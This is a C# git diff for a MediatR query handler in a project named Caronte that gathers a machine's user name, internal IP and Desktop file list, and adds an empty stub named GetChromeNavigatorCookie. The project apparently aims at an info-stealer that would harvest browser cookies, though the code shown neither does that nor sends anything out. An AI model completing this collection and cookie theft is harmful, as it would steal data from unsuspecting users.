@@ -1,4 +1,4 @@
-﻿using CaronteLib.Models;
+﻿using CaronteLib.Models.ClientInformation;
 using MediatR;
 using System;
 using System.Collections.Generic;
@@ -11,13 +11,11 @@ using System.Threading.Tasks;
 
 namespace Caronte.Modules.GetClientInformation
 {
-    public class GetClientInformationQueryHandler : IRequestHandler<ClientInformationModel>
+    public class GetClientInformationQueryHandler : IRequestHandler<GetClientInformationQuery, ClientInformationModel>
     {
-        public Task<Unit> Handle(ClientInformationModel request, CancellationToken cancellationToken)
+        public Task<ClientInformationModel> Handle(GetClientInformationQuery request, CancellationToken cancellationToken)
         {
-
-
-            return Unit.Value;
+            return Task.FromResult(new ClientInformationModel());
         }
 
         private string GetUsername()
@@ -46,6 +44,8 @@ namespace Caronte.Modules.GetClientInformation
                 foreach (var ip in dns.AddressList)
                     if (ip.AddressFamily == AddressFamily.InterNetwork)
                         return ip.ToString();
+
+                throw new Exception("Não foi possivel resolver o host interno.");
             }
             catch
             {
@@ -72,7 +72,7 @@ namespace Caronte.Modules.GetClientInformation
         {
             try
             {
-                string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                var DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                 var files = Directory.GetFiles(DesktopPath).ToList();
 
                 return files;
@@ -81,6 +81,20 @@ namespace Caronte.Modules.GetClientInformation
             {
                 return new List<string>();
             }
+        }
+
+        private byte[] GetChromeNavigatorCookie()
+        {
+            try
+            {
+
+            }
+            catch (Exception ex)
+            {
+
+            }
+
+            return new byte[0];
         }
     }
 }
